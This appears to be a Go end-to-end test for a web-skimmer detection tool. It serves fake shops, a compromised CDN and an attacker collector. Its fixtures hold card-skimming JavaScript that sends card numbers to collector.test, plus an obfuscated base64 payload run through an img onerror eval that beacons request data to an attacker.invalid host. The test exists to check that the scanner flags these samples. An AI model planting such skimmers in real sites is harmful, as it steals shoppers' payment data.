package scan

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/aviollaz/skimwatch/internal/config"
	"github.com/aviollaz/skimwatch/internal/fetch"
	"github.com/aviollaz/skimwatch/internal/intel"
	"github.com/aviollaz/skimwatch/internal/model"
	"github.com/aviollaz/skimwatch/internal/report"
	"github.com/aviollaz/skimwatch/internal/runtime"
	"github.com/aviollaz/skimwatch/internal/store"
)

// A small fake internet. Every *.test hostname is served by one local server that routes on
// the Host header: two stores, a compromised CDN and the attacker's collector.
type internet struct {
	srv        *httptest.Server
	port       string
	cdnVersion atomic.Int32 // 1 = clean library, 2 = library with a skimmer appended (supply-chain swap)
	stolen     atomic.Int32
}

const cleanLib = `window.Carousel = function(el){ this.el = el; this.next = function(){ return 1; }; };`

const swappedLib = cleanLib + `
document.addEventListener("change", function(){
  var n = document.querySelector('input[name="cardnumber"]');
  if (n && n.value.length > 12) { new Image().src = "http://collector.test:PORT/p.gif?d=" + btoa(n.value); }
});`

func newInternet(t *testing.T) *internet {
	in := &internet{}
	in.cdnVersion.Store(1)
	in.srv = httptest.NewServer(http.HandlerFunc(in.serve))
	in.port = in.srv.URL[strings.LastIndex(in.srv.URL, ":")+1:]
	t.Cleanup(in.srv.Close)
	return in
}

func (in *internet) url(host, path string) string {
	return fmt.Sprintf("http://%s:%s%s", host, in.port, path)
}

func (in *internet) serve(w http.ResponseWriter, r *http.Request) {
	host := strings.Split(r.Host, ":")[0]
	html := func(s string) { w.Header().Set("Content-Type", "text/html"); io.WriteString(w, s) }
	js := func(s string) { w.Header().Set("Content-Type", "application/javascript"); io.WriteString(w, s) }
	switch {
	case r.URL.Path == "/robots.txt":
		io.WriteString(w, "User-agent: *\nDisallow: /admin\n")
	case host == "collector.test":
		in.stolen.Add(1)
	case host == "cdn-libs.test":
		lib := cleanLib
		if in.cdnVersion.Load() == 2 {
			lib = strings.ReplaceAll(swappedLib, "PORT", in.port)
		}
		js(lib)
	case host == "clean-shop.test":
		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self' https://www.googletagmanager.com")
		w.Header().Set("X-Frame-Options", "DENY")
		html(`<!doctype html><html><body><h1>Clean shop</h1>
<form id="newsletter"><input type="email" name="email"></form>
<script src="/static/app.js"></script></body></html>`)
	case host == "shop.test" && r.URL.Path == "/static/app.js", host == "clean-shop.test" && r.URL.Path == "/static/app.js":
		js(`document.getElementById("newsletter").addEventListener("submit", function(e){ e.preventDefault(); fetch("/api/newsletter", {method: "POST"}); });`)
	case host == "shop.test" && r.URL.Path == "/producto/aceite":
		html(`<!doctype html><html><body><h1>Aceite</h1><div class="description">Aceite puro.
<img src="x" style="display:none" onerror="eval(atob('` + vtexSkimmerB64 + `'))"></div></body></html>`)
	case host == "shop.test" && r.URL.Path == "/checkout":
		html(`<!doctype html><html><body><form><input name="cardnumber" autocomplete="cc-number"><input name="cvv"></form>
<script src="` + in.url("cdn-libs.test", "/carousel.js") + `"></script>
<script src="/static/app.js"></script></body></html>`)
	default:
		http.NotFound(w, r)
	}
}

// base64 of a small checkout hook, the same family as the Vea skimmer.
var vtexSkimmerB64 = "d2luZG93LmZldGNoID0gZnVuY3Rpb24odSwgbyl7IG5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwczovL2NvbGxlY3Rvci5hdHRhY2tlci5pbnZhbGlkL2MiLCBvICYmIG8uYm9keSk7IHJldHVybiB1OyB9Ow=="

func (in *internet) transport() http.RoundTripper {
	addr := in.srv.Listener.Addr().String()
	return &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, addr)
		},
	}
}

func chrome() string { return os.Getenv("SKIMWATCH_CHROME") }

func TestEndToEnd(t *testing.T) {
	in := newInternet(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	cfg := &config.Config{
		Settings: config.Defaults(),
		Targets: []config.Target{
			{Name: "clean-shop", Pages: []string{in.url("clean-shop.test", "/")}},
			{Name: "shop", Pages: []string{in.url("shop.test", "/producto/aceite"), in.url("shop.test", "/checkout")}},
		},
	}
	cfg.Settings.RequestDelay = 10 * time.Millisecond
	cfg.Settings.RuntimeWait = 1500 * time.Millisecond

	var browser *runtime.Browser
	if p := chrome(); p != "" {
		b, err := runtime.NewBrowser(ctx, runtime.BrowserOptions{
			ExecPath: p, UserAgent: "skimwatch-test", NoSandbox: true, NoProxy: true,
			HostRules: "MAP *.test 127.0.0.1",
		})
		if err != nil {
			t.Fatal(err)
		}
		defer b.Close()
		browser = b
	} else {
		t.Log("SKIMWATCH_CHROME not set: runtime layer skipped")
	}

	checker, _ := intel.New(intel.Options{})
	history, err := store.NewFileStore(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	s := &Scanner{
		Config: cfg,
		Fetcher: fetch.New(fetch.Options{
			UserAgent: "skimwatch-test", Delay: 10 * time.Millisecond, Timeout: 10 * time.Second,
			MaxBodyBytes: 1 << 20, RespectRobots: true, Transport: in.transport(),
		}),
		Browser: browser,
		Intel:   checker,
		Store:   history,
		Log:     slog.New(slog.NewTextHandler(io.Discard, nil)),
	}

	// Night 1: the CDN library is clean.
	first := byTarget(s.Run(ctx))
	for _, f := range first["clean-shop"].Findings {
		if f.Severity >= model.Medium && f.Rule != "no-https" { // the fake internet has no TLS
			t.Errorf("clean shop raised %s: %s (%s)", f.Severity, f.Title, f.Location)
		}
	}
	shop := rules(first["shop"])
	if shop["eval-decoded"] != model.Critical || shop["skimmer-pattern"] != model.Critical {
		t.Errorf("the injected product-description skimmer should be critical, got %v", shop)
	}
	if _, ok := shop["third-party-script-changed"]; ok {
		t.Error("first scan has no baseline and must not report changes")
	}

	// Night 2: the CDN is compromised. The library URL is the same; only its content changed.
	in.cdnVersion.Store(2)
	second := byTarget(s.Run(ctx))
	shop2 := rules(second["shop"])
	if shop2["third-party-script-changed"] != model.Medium {
		t.Errorf("the swapped CDN script should be reported as changed, got %v", shop2)
	}
	if shop2["skimmer-pattern"] != model.Critical {
		t.Errorf("the swapped script's new code should be recognized as a skimmer, got %v", shop2)
	}
	if browser != nil {
		if shop2["canary-exfiltration"] != model.Critical {
			t.Errorf("the canary card number should be caught leaving the page, got %v", shop2)
		}
		if in.stolen.Load() == 0 {
			t.Error("the fixture skimmer should have fired at least once")
		}
	}
	if out := os.Getenv("SKIMWATCH_REPORT_OUT"); out != "" {
		f, _ := os.Create(out)
		report.Write(f, s.Run(ctx))
		f.Close()
	}
	var newCritical bool
	for _, f := range second["shop"].Findings {
		if f.New && f.Severity == model.Critical && f.Location == in.url("cdn-libs.test", "/carousel.js") {
			newCritical = true
		}
	}
	if !newCritical {
		t.Error("the supply-chain skimmer should be marked as a new critical finding")
	}
}

func byTarget(scans []*model.Scan) map[string]*model.Scan {
	m := map[string]*model.Scan{}
	for _, s := range scans {
		m[s.Target] = s
	}
	return m
}

func rules(s *model.Scan) map[string]model.Severity {
	m := map[string]model.Severity{}
	for _, f := range s.Findings {
		if cur, ok := m[f.Rule]; !ok || f.Severity > cur {
			m[f.Rule] = f.Severity
		}
	}
	return m
}
